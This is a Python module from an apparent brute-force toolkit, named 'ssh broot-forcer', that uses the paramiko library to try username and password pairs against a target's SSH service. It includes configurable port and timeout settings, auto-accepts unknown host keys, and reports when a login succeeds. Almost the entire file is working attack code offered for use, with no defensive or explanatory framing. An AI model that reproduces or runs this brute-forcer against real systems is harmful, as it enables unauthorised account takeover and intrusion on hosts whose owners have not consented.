import sys
import os
import requires
sys.path.append(os.getcwd() + "\\..\\misc")
import colors
sys.path.append(os.getcwd() + "\\..\\..\\src")
import var

try:
    import paramiko
except ModuleNotFoundError:
    colors.PrintColor("WARN", "Unable to find 'paramiko', install?")
    ans = input("[Y/N] ")
    if ans.lower() == "y":
        requires.install('paramiko')
    else:
        colors.PrintColor("FAIL", "'Paramiko' is a dependency!")
    
###################
#ABOUT SECTION
###################
name = "ssh broot-forcer"
author = "midnightseer"
version = "1.0"
art = ""
###################
#Executed on Import
###################
banner = '''
                    $$\       
                    $$ |      
 $$$$$$$\  $$$$$$$\ $$$$$$$\  
$$  _____|$$  _____|$$  __$$\ 
\$$$$$$\  \$$$$$$\  $$ |  $$ |
 \____$$\  \____$$\ $$ |  $$ |
$$$$$$$  |$$$$$$$  |$$ |  $$ |
\_______/ \_______/ \__|  \__|
{}
{}
Author:  {}
Version: {}'''.format(art, name, author, version)
print(banner)
###################

#This is an example, you do not necessarily need extra commands
module_cmds = {
}

def module_commands(cmds):
    pass

#This is an example, variables must have a unique name
module_vars = {
    "port": {
        "Name": "Port",
        "Value": 22,
        "Type": 'Integer',
        "Default": 22,
        "Help": "This is the target port running the ssh service",
        "Example": "Port 22"
    },
    "timeout": {
        "Name": "Timeout",
        "Value": 3,
        "Type": 'Integer',
        "Default": 3,
        "Help": "Amount of seconds for the TCP timeout.",
        "Example": "10 (seconds)"
    }, 
    "banner-timeout": {
        "Name": "Banner-Timeout",
        "Value": 10,
        "Type": 'Integer',
        "Default": 10,
        "Help": "Amount of seconds to wait for the SSH banner.",
        "Example": "10 (seconds)"
    },
    "allow-hosts": {
        "Name": "Allow-Hosts",
        "Value": True,
        "Type": 'Boolean',
        "Default": True,
        "Help": "Allow unknown hosts to connect to.",
        "Example": "Yes, connect to unknown hosts."
    }
}


#This function does the main exection of the brutefore method
def run(username, password, target):
    success = False
    verbose = var.global_vars['verbose']['Value']
    timeout = module_vars['timeout']['Value']
    port = module_vars['port']['Value']
    banner_timeout = module_vars['banner-timeout']['Value']
    attempt = "Target:{} Username:{} Password:{}".format(target, username, password)

    try:
        client = paramiko.SSHClient()
        if module_vars['allow-hosts']['Value']:  
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if verbose:
            colors.PrintColor("INFO", "Trying " + attempt)
        client.connect(target, username=username, password=password, timeout=timeout, banner_timeout=banner_timeout, port=port)
        client.close()
        success = True
    except paramiko.AuthenticationException:
        if verbose:
            colors.PrintColor("FAIL", "Failed Authentication --> {}".format(attempt))
    except paramiko.SSHException as sshException:
        if verbose:    
            colors.PrintColor("FAIL", "Fail --> {} Could not establish SSH connection".format(attempt))
    except Exception as e:
        if verbose:
            colors.PrintColor("FAIL", "Fail --> {} Error! {}".format(attempt, e))
    finally:
        return success
        